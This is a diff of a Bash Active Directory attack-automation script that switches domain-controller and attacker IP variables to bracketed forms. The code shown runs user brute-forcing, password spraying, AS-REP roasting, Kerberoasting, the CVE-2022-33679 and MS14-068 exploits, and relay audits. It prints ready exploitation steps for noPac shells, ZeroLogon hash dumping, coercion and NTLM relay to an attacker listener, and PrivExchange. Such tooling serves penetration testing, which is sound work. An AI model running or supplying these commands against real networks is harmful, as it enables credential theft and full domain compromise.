             if [ "${ldaps_bool}" == true ]; then ldaps_param="--tlsmode tls --port ${ldap_port}"; else ldaps_param=""; fi
-            run_command "${ldapnomnom} --server ${dc_ip} --port ${ldap_port} --dnsdomain ${dc_domain} ${ldaps_param} --maxservers 4 --parallel 8 --input ${user_wordlist} --output ${Users_dir}/users_list_ldapnomnom_${dc_domain}.txt" | tee -a "${BruteForce_dir}/ldapnomnom_user_output_${dc_domain}.txt"
+            run_command "${ldapnomnom} --server ${dc_ip_bracket} --port ${ldap_port} --dnsdomain ${dc_domain} ${ldaps_param} --maxservers 4 --parallel 8 --input ${user_wordlist} --output ${Users_dir}/users_list_ldapnomnom_${dc_domain}.txt" | tee -a "${BruteForce_dir}/ldapnomnom_user_output_${dc_domain}.txt"
             if [ -s "${Users_dir}/users_list_ldapnomnom_${dc_domain}.txt" ]; then
                 echo -e ""
                 echo -e "${GREEN}[+] Printing valid accounts...${NC}"
@@ -2878,7 +2916,7 @@ spearspray_console() {
         else
             echo -e "${BLUE}[*] Launching spearspray${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
-            run_command "${spearspray} ${argument_spearspray} -dc ${dc_ip} ${ldaps_param}" 2>&1 | tee -a "${BruteForce_dir}/spearspray_output_${dc_domain}.txt"
+            run_command "${spearspray} ${argument_spearspray} -dc ${dc_ip_bracket} ${ldaps_param}" 2>&1 | tee -a "${BruteForce_dir}/spearspray_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -2897,11 +2935,11 @@ asrep_attack() {
                 echo -e "${YELLOW}[i] No credentials for target domain provided. Using $user_wordlist wordlist...${NC}"
                 users_scan_list=${user_wordlist}
             fi
-            run_command "${impacket_GetNPUsers} ${dc_domain}/ -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
+            run_command "${impacket_GetNPUsers} ${dc_domain}/ -usersfile ${users_scan_list} -request -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS}" >"${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
             grep "krb5asrep" "${Kerberos_dir}/asreproast_output_${dc_domain}.txt" | sed "s/\$krb5asrep\$23\$//" >"${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" 2>&1
         else
-            run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"
-            run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
+            run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS}"
+            run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS}" >"${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
             #${netexec} ${ne_verbose} smb ${curr_targets_list} "${argument_ne}" --asreproast --log ${Kerberos_dir}/asreproast_output_${dc_domain}.txt" 2>&1
         fi
         if grep -q 'error' "${Kerberos_dir}/asreproast_output_${dc_domain}.txt"; then
@@ -2938,7 +2976,7 @@ asreprc4_attack() {
                 echo -e "${GREEN}[+] ASREP-Roastable user found: ${asrep_user}${NC}"
                 current_dir=$(pwd)
                 cd "${Credentials_dir}" || exit
-                run_command "${python3} ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}" 2>&1 | tee "${Kerberos_dir}/CVE-2022-33679_output_${dc_domain}.txt"
+                run_command "${python3} ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip_bracket} ${argument_CVE202233679}" 2>&1 | tee "${Kerberos_dir}/CVE-2022-33679_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 if [ -s "${Kerberos_dir}/CVE-2022-33679_output_${dc_domain}.txt" ]; then
                     echo -e "${GREEN}[+] Exploit output saved to:${NC} ${Kerberos_dir}/CVE-2022-33679_output_${dc_domain}.txt"
@@ -2970,7 +3008,7 @@ kerberoast_attack() {
             echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
             asrep_user=$(cut -d "@" -f 1 "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" | cut -d '$' -f 4 | head -n 1)
             if [ ! "${asrep_user}" == "" ]; then
-                run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -outputfile ${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt ${dc_domain}/" >> "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"
+                run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS} -outputfile ${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt ${dc_domain}/" >> "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"
                 if grep -q 'error' "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                 elif [ "${noexec_bool}" == "false" ]; then
@@ -2986,8 +3024,8 @@ kerberoast_attack() {
             fi
         else
             echo -e "${BLUE}[*] Kerberoast Attack${NC}"
-            run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" | tee "${Kerberos_dir}/kerberoast_list_output_${dc_domain}.txt"
-            run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" >"${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"
+            run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" | tee "${Kerberos_dir}/kerberoast_list_output_${dc_domain}.txt"
+            run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" >"${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"
             #${netexec} ${ne_verbose} smb ${curr_targets_list} "${argument_ne}" --kerberoasting --log ${Kerberos_dir}/kerberoast_output_${dc_domain}.txt" 2>&1
             if grep -q 'error' "${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"; then
                 echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
@@ -3011,10 +3049,10 @@ krbjack_attack() {
         echo -e "${RED}[-] Please verify the location of krbjack${NC}"
     else
         echo -e "${BLUE}[*] Checking for DNS unsecure updates using krbjack${NC}"
-        run_command "${krbjack} check --dc-ip ${dc_ip} --domain ${domain}" 2>&1 | tee "${Kerberos_dir}/krbjack_output_${dc_domain}.txt"
+        run_command "${krbjack} check --dc-ip ${dc_ip_bracket} --domain ${domain}" 2>&1 | tee "${Kerberos_dir}/krbjack_output_${dc_domain}.txt"
         if ! grep -q 'This domain IS NOT vulnerable' "${Kerberos_dir}/krbjack_output_${dc_domain}.txt"; then
             echo -e "${GREEN}[+] DNS unsecure updates possible! Follow steps below to abuse the vuln and perform AP_REQ hijacking:${NC}"
-            echo -e "${krbjack} run --dc-ip ${dc_ip} --target-ip ${dc_ip} --domain ${domain} --target-name ${dc_NETBIOS} --ports 139,445 --executable <PATH_TO_EXECUTABLE_TO_RUN>"
+            echo -e "${krbjack} run --dc-ip ${dc_ip_bracket} --target-ip ${dc_ip_bracket} --domain ${domain} --target-name ${dc_NETBIOS} --ports 139,445 --executable <PATH_TO_EXECUTABLE_TO_RUN>"
         fi
     fi
     echo -e ""
@@ -3033,7 +3071,7 @@ kerborpheus_attack() {
             echo "$(date +%Y-%m-%d\ %H:%M:%S); ${orpheus} | tee -a ${Kerberos_dir}/orpheus_output_${dc_domain}.txt" >>"$command_log"
             echo -e "${YELLOW}[i]${NC} Running command: ${python3} ${orpheus}" > /dev/tty
             (
-                echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${Kerberos_dir}/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"
+                echo -e "cred ${argument_imp}\ndcip ${dc_ip_bracket}\nfile ${Kerberos_dir}/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"
                 cat /dev/tty
             ) | /usr/bin/script -qc "${python3} ${orpheus}" /dev/null | tee -a "${Kerberos_dir}/orpheus_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
@@ -3061,9 +3099,9 @@ nopac_check() {
         if grep -q "VULNERABLE" "${Kerberos_dir}/ne_nopac_output_${dc_domain}.txt"; then
             echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
             echo -e "${CYAN}# Get shell:${NC}" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
-            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "noPac.py ${argument_imp} -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
             echo -e "${CYAN}# Dump hashes:${NC}" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
-            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "noPac.py ${argument_imp} -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3077,11 +3115,11 @@ ms14-068_check() {
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support Kerberos authentication${NC}"
         else
-            run_command "${impacket_goldenPac} ${argument_imp_gp}\\@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee "${Kerberos_dir}/ms14-068_output_${dc_domain}.txt"
+            run_command "${impacket_goldenPac} ${argument_imp_gp}\\@${dc_FQDN} None -target-ip ${dc_ip_bracket}" 2>&1 | tee "${Kerberos_dir}/ms14-068_output_${dc_domain}.txt"
             if grep -q "found vulnerable" "${Kerberos_dir}/ms14-068_output_${dc_domain}.txt"; then
                 echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}" | tee -a "${Kerberos_dir}/ms14-068_exploitation_steps_${dc_domain}.txt"
                 echo -e "${CYAN}# Execute command below to get shell:${NC}" | tee -a "${Kerberos_dir}/ms14-068_exploitation_steps_${dc_domain}.txt"
-                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}" | tee -a "${Kerberos_dir}/ms14-068_exploitation_steps_${dc_domain}.txt"
+                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip_bracket}" | tee -a "${Kerberos_dir}/ms14-068_exploitation_steps_${dc_domain}.txt"
             fi
         fi
     fi
@@ -3214,7 +3252,7 @@ finduncshar_scan() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
-            run_command "${python3} ${FindUncommonShares} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${curr_targets_list} --check-user-access --export-xlsx ${Shares_dir}/finduncshar_${user_var}.xlsx --kdcHost ${dc_FQDN} --no-ldap" 2>&1 | tee -a "${Shares_dir}/finduncshar_shares_output_${user_var}.txt"
+            run_command "${python3} ${FindUncommonShares} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip_bracket} -tf ${curr_targets_list} --check-user-access --export-xlsx ${Shares_dir}/finduncshar_${user_var}.xlsx --kdcHost ${dc_FQDN} --no-ldap" 2>&1 | tee -a "${Shares_dir}/finduncshar_shares_output_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -3230,7 +3268,7 @@ finduncshar_fullscan() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
-            run_command "${python3} ${FindUncommonShares} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} --check-user-access --export-xlsx ${Shares_dir}/finduncshar_full_${user_var}.xlsx --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${Shares_dir}/finduncshar_shares_full_output_${user_var}.txt"
+            run_command "${python3} ${FindUncommonShares} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip_bracket} --check-user-access --export-xlsx ${Shares_dir}/finduncshar_full_${user_var}.xlsx --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${Shares_dir}/finduncshar_shares_full_output_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -3273,10 +3311,10 @@ sharehound_scan() {
             mkdir -p "${Shares_dir}/sharehound_${user_var}/"
             cd "${Shares_dir}/sharehound_${user_var}/" || exit
             if [ "${nullsess_bool}" == true ]; then
-                run_command "${sharehound} -au ${rand_user} -ap '' ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip} -ns ${dns_ip} --logfile ${Shares_dir}/sharehound_${user_var}/sharehound_null.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_nullsess_output.txt"
+                run_command "${sharehound} -au ${rand_user} -ap '' ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip_bracket} -ns ${dns_ip} --logfile ${Shares_dir}/sharehound_${user_var}/sharehound_null.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_nullsess_output.txt"
                 if [ -s "opengraph.json" ]; then mv opengraph.json "opengraph_null_${user_var}.json"; fi
             fi
-            run_command "${sharehound} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip} -ns ${dns_ip} --logfile ${Shares_dir}/sharehound_${user_var}/sharehound.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_output.txt"
+            run_command "${sharehound} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip_bracket} -ns ${dns_ip} --logfile ${Shares_dir}/sharehound_${user_var}/sharehound.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_output.txt"
             if [ -s "opengraph.json" ]; then mv opengraph.json "opengraph_${user_var}.json"; fi
             cd "${current_dir}" || exit
         fi
@@ -3298,10 +3336,10 @@ sharehound_scan_allsubnets() {
             mkdir -p "${Shares_dir}/sharehound_${user_var}/"
             cd "${Shares_dir}/sharehound_${user_var}/" || exit
             if [ "${nullsess_bool}" == true ]; then
-                run_command "${sharehound} -au ${rand_user} -ap '' ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip} -ns ${dns_ip} --subnets --logfile ${Shares_dir}/sharehound_${user_var}/sharehound_null_subnets_.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_nullsess_subnets_output.txt"
+                run_command "${sharehound} -au ${rand_user} -ap '' ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip_bracket} -ns ${dns_ip} --subnets --logfile ${Shares_dir}/sharehound_${user_var}/sharehound_null_subnets_.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_nullsess_subnets_output.txt"
                 if [ -s "opengraph.json" ]; then mv opengraph.json "opengraph_null_subnets_${user_var}.json"; fi
             fi
-            run_command "${sharehound} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip} -ns ${dns_ip} --subnets --logfile ${Shares_dir}/sharehound_${user_var}/sharehound_subnets.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_subnets_output.txt"
+            run_command "${sharehound} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip_bracket} -ns ${dns_ip} --subnets --logfile ${Shares_dir}/sharehound_${user_var}/sharehound_subnets.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_subnets_output.txt"
             if [ -s "opengraph.json" ]; then mv opengraph.json "opengraph_subnets_${user_var}.json"; fi
             cd "${current_dir}" || exit
         fi
@@ -3360,7 +3398,7 @@ scriptscout_scan(){
             current_dir=$(pwd)
             mkdir -p "${Shares_dir}/ScriptScout_${user_var}/"
             cd "${Shares_dir}/ScriptScout_${user_var}" || exit
-            run_command "${python3} ${ScriptScout} ${argument_scriptscout} -ip-dc ${dc_ip} -la Y" | tee -a "${Shares_dir}/scriptscout_output_${user_var}.txt"
+            run_command "${python3} ${ScriptScout} ${argument_scriptscout} -ip-dc ${dc_ip_bracket} -la Y" | tee -a "${Shares_dir}/scriptscout_output_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
     fi
@@ -3402,13 +3440,13 @@ zerologon_check() {
     if grep -q "VULNERABLE" "${Vulnerabilities_dir}/ne_zerologon_output_${dc_domain}.txt"; then
         echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS ${dc_ip_bracket}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}2. Obtain the Domain Admin's NT hash:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@${dc_ip_bracket} -no-pass -just-dc-user Administrator" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}3. Obtain the machine account hex encoded password:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@${dc_ip_bracket}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}4. Restore the machine account password:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "restorepassword.py -target-ip ${dc_ip_bracket} $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
     fi
     echo -e ""
 }
@@ -3425,7 +3463,8 @@ coerceplus_check() {
     if grep -q "VULNERABLE" "${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt"; then
         echo -e "${GREEN}[+] Target(s) vulnerable to coercing found! Consider checking for CVE-2025-33073 (https://github.com/mverschu/CVE-2025-33073). Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}1. Add DNS record pointing to the attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
-        echo -e "${bloodyad} ${argument_bloodyad} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${attacker_IP}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        # bloodyAD add dnsRecord creates an A (IPv4) record; IPv6/AAAA is not supported upstream
+        echo -e "${bloodyad} ${argument_bloodyad} --host ${dc_FQDN} --dc-ip ${dc_ip_bracket} --dns ${dns_ip} add dnsRecord localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${attacker_IP}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}2. Use ntlmrelayx to run a listener and execute secretdump:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "ntlmrelayx.py -t smb://[ TARGET ] -smb2support" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}3. Coerce the target machine to connect back to your attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
@@ -3450,7 +3489,7 @@ coerce_netexec() {
     done
     echo -e "${CYAN}[*] Example: 10.10.10.10 or kali@80 or localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${NC}"
     set_attackerIP
-    run_command "${netexec} ${ne_verbose} smb ${target_coerce} ${argument_ne} -M coerce_plus -o LISTENER="${attacker_IP}" --log ${Vulnerabilities_dir}/ne_coerce_attack_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${target_coerce} ${argument_ne} -M coerce_plus -o LISTENER="${attacker_IP_bracket}" --log ${Vulnerabilities_dir}/ne_coerce_attack_output_${dc_domain}.txt" 2>&1
 
     echo -e ""
 }
@@ -3517,13 +3556,13 @@ coercer_check() {
     else
         mkdir -p "${Vulnerabilities_dir}/Coercer"
         echo -e "${BLUE}[*] Running scan using coercer ${NC}"
-        run_command "${coercer} scan ${argument_coercer} -f ${curr_targets_list} --dc-ip ${dc_ip} --auth-type smb --export-xlsx ${Vulnerabilities_dir}/Coercer/coercer_output_${dc_domain}.xlsx" | tee "${Vulnerabilities_dir}/Coercer/coercer_output_${dc_domain}.txt"
+        run_command "${coercer} scan ${argument_coercer} -f ${curr_targets_list} --dc-ip ${dc_ip_bracket} --auth-type smb --export-xlsx ${Vulnerabilities_dir}/Coercer/coercer_output_${dc_domain}.xlsx" | tee "${Vulnerabilities_dir}/Coercer/coercer_output_${dc_domain}.txt"
         if grep -q -r "SMB  Auth" "${Vulnerabilities_dir}/Coercer/"; then
             echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
             echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
             echo -e "sudo responder -I ${attacker_interface}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
             echo -e "${CYAN}2. Coerce target server:${NC}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l ${attacker_IP} --dc-ip ${dc_ip}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l ${attacker_IP_bracket} --dc-ip ${dc_ip_bracket}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
         fi
         echo -e ""
     fi
@@ -3556,7 +3595,7 @@ privexchange_check() {
                 read -rp ">> " target_exchange </dev/tty
             done
             set_attackerIP
-            run_command "${python3} ${privexchange} ${argument_privexchange} -ah ${attacker_IP} ${target_exchange}" | tee "${Vulnerabilities_dir}/privexchange_${dc_domain}.txt"
+            run_command "${python3} ${privexchange} ${argument_privexchange} -ah ${attacker_IP_bracket} ${target_exchange}" | tee "${Vulnerabilities_dir}/privexchange_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3601,7 +3640,7 @@ findunusess_check() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
-            run_command "${python3} ${FindUnusualSessions} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${curr_targets_list} --export-xlsx ${Vulnerabilities_dir}/findususess_${dc_domain}.xlsx --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${Vulnerabilities_dir}/findususess_output_${dc_domain}.txt"
+            run_command "${python3} ${FindUnusualSessions} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip_bracket} -tf ${curr_targets_list} --export-xlsx ${Vulnerabilities_dir}/findususess_${dc_domain}.xlsx --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${Vulnerabilities_dir}/findususess_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3619,7 +3658,7 @@ badsuccessor_check() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
             echo -e "${CYAN}[*] Searching for identities with BadSuccessor privileges${NC}"
-            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action search" 2>&1 | tee -a "${Vulnerabilities_dir}/badsuccessor_search_${user_var}.txt"
+            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip_bracket} -dc-host ${dc_NETBIOS} ${ldaps_param} -action search" 2>&1 | tee -a "${Vulnerabilities_dir}/badsuccessor_search_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -3634,9 +3673,9 @@ relayking_check() {
         if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param="--ldap"; fi
         if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
         if [ "${nullsess_bool}" == true ]; then
-            run_command "${python3} ${relayking} ${argument_rking} --protocols smb,ldap,http -t ${curr_targets_list} --dc-ip ${dc_ip} ${ldaps_param} ${dnstcp_param} -ns ${dns_ip} -o plaintext,csv,json --output-file ${Vulnerabilities_dir}/relayking/relayking_nullauth_${dc_domain}" | tee -a "${Vulnerabilities_dir}/relayking/relayking_nullauth_output_${dc_domain}.txt"
+            run_command "${python3} ${relayking} ${argument_rking} --protocols smb,ldap,http -t ${curr_targets_list} --dc-ip ${dc_ip_bracket} ${ldaps_param} ${dnstcp_param} -ns ${dns_ip} -o plaintext,csv,json --output-file ${Vulnerabilities_dir}/relayking/relayking_nullauth_${dc_domain}" | tee -a "${Vulnerabilities_dir}/relayking/relayking_nullauth_output_${dc_domain}.txt"
         else
-            run_command "${python3} ${relayking} ${argument_rking} --audit --protocols smb,ldap,ldaps,mssql,http,https -t ${curr_targets_list} --dc-ip ${dc_ip} ${ldaps_param} ${dnstcp_param} -ns ${dns_ip} --threads 10 -o plaintext,csv,json --output-file ${Vulnerabilities_dir}/relayking/relayking_audit_${dc_domain} --proto-portscan --gen-relay-list ${Vulnerabilities_dir}/relayking/relaytargets_output_${dc_domain}.txt" | tee -a "${Vulnerabilities_dir}/relayking/relayking_audit_output_${dc_domain}.txt"
+            run_command "${python3} ${relayking} ${argument_rking} --audit --protocols smb,ldap,ldaps,mssql,http,https -t ${curr_targets_list} --dc-ip ${dc_ip_bracket} ${ldaps_param} ${dnstcp_param} -ns ${dns_ip} --threads 10 -o plaintext,csv,json --output-file ${Vulnerabilities_dir}/relayking/relayking_audit_${dc_domain} --proto-portscan --gen-relay-list ${Vulnerabilities_dir}/relayking/relaytargets_output_${dc_domain}.txt" | tee -a "${Vulnerabilities_dir}/relayking/relayking_audit_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3658,9 +3697,9 @@ netexec_drop(){
         echo -e "${RED}Invalid share.${NC} Please specify share to mount:"
         read -rp ">> " drop_share </dev/tty
     done
